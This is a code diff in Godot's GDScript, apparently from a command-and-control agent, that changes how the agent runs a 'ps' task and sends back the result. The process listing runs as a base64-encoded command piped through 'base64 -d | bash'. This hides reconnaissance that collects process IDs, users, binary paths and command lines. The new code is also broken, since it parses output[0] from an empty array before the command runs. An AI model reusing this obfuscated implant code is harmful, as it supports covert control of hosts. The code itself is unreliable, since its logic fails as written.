@@ -33,7 +33,7 @@ func _on_tasking_ps(task):
 			status = "success"
 			output = "ps command executed with success"
 
-		api.agent_response(
+		api.send_agent_response(
 			api.create_task_response(
 				true,
 				true,
@@ -52,11 +52,12 @@ func _on_tasking_ps(task):
 
 func get_linux_ps():
 	var output = []
+	var test_json_conv = JSON.new()
+	test_json_conv.parse(output[0])
+	var exit_code = OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" | base64 -d | bash'], output, true)
 
 	return {
-		"exit_code": OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" | base64 -d | bash'], true, output, true),
-		var test_json_conv = JSON.new()
-		test_json_conv.parse(output[0])
+		"exit_code": exit_code,
 		"processes": test_json_conv.get_data()
 	}
 
